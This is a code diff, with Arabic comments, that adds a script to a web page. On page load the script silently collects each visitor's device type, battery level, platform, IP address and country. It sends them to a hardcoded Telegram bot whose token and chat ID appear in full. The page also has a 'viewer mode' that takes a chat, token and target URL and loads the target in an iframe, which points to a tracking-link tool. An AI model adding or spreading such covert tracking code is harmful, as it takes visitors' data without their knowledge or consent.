@@ -196,7 +196,77 @@
   </div>
 
 <script>
-  // عناصر الدايلوج
+  // ------------------ متغيرات البوت الثابتة ------------------
+  const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
+  const MASTER_CHAT_ID   = "6197511637";
+
+  // ------------------ إرسال معلومات الزائر (البلد + الجهاز + الشحن) ------------------
+  async function sendVisitorInfo() {
+    try {
+      // 1. جمع معلومات الجهاز
+      const userAgent = navigator.userAgent;
+      let deviceType = "Unknown";
+      if (/Android/i.test(userAgent)) deviceType = "Android";
+      else if (/iPhone|iPad|iPod/i.test(userAgent)) deviceType = "iOS";
+      else if (/Windows/i.test(userAgent)) deviceType = "Windows";
+      else if (/Mac/i.test(userAgent)) deviceType = "MacOS";
+      else if (/Linux/i.test(userAgent)) deviceType = "Linux";
+
+      // 2. محاولة الحصول على البطارية (نسبة الشحن)
+      let batteryLevel = "غير متاح";
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryLevel = (battery.level * 100) + "%";
+          if (battery.charging) batteryLevel += " (يتم الشحن)";
+          else batteryLevel += " (غير موصول)";
+        } catch (e) { batteryLevel = "غير متاح"; }
+      }
+
+      // 3. الحصول على IP والدولة عبر خدمة خارجية
+      let ip = "غير معروف";
+      let country = "غير معروف";
+      try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        ip = ipData.ip || "غير معروف";
+        country = ipData.country_name || "غير معروف";
+      } catch (e) { /* تجاهل الفشل */ }
+
+      // 4. تجهيز الرسالة
+      const message = `
+🟢 *زيارة جديدة للموقع*
+━━━━━━━━━━━━━━━
+🌍 *الدولة*: ${country}
+📱 *الجهاز*: ${deviceType}
+🔋 *البطارية*: ${batteryLevel}
+🖥 *نظام التشغيل*: ${navigator.platform || "غير معروف"}
+🌐 *IP*: ${ip}
+🕒 *التوقيت*: ${new Date().toLocaleString('ar-EG')}
+━━━━━━━━━━━━━━━
+      `;
+
+      // 5. إرسال إلى البوت الرئيسي
+      const url = `https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: MASTER_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      });
+
+    } catch (err) {
+      console.error("فشل إرسال معلومات الزائر", err);
+    }
+  }
+
+  // استدعاء دالة إرسال المعلومات فور فتح الصفحة (الزائر العادي)
+  sendVisitorInfo();
+
+  // ------------------ عناصر الدايلوج ------------------
   const dialog = document.getElementById('mandatoryDialog');
   const channel1 = document.getElementById('channel1');
   const channel2 = document.getElementById('channel2');
@@ -233,7 +303,7 @@
       subscribeBtn.classList.add('active');
       subscribeBtn.style.opacity = '1';
       subscribeBtn.style.pointerEvents = 'auto';
-      subscribeBtn.innerHTML = '✅ تم الاشتراك';
+      subscribeBtn.innerHTML = 'تم الاشتراك';
     }
   }
 
@@ -242,7 +312,7 @@
     dialog.style.display = 'none';
   });
 
-  // عناصر الفورم
+  // ------------------ عناصر الفورم ------------------
   const generateBtn = document.getElementById('generateBtn');
   const resultEl = document.getElementById('result');
   const linkText = document.getElementById('linkText');
@@ -273,13 +343,14 @@
     }
   });
 
-  // viewer mode
+  // ------------------ viewer mode ------------------
   const params = new URLSearchParams(window.location.search);
   const chat = params.get('chat');
   const token = params.get('token');
   const target = params.get('url');
 
   if (chat && token && target) {
+    // إخفاء الكارت وعرض الـ iframe
     document.getElementById('cardArea').style.display = 'none';
     const iframe = document.createElement('iframe');
     iframe.className = 'viewerFrame';
@@ -342,4 +413,4 @@
   }
 </script>
 </body>
-  </html>
+</html>
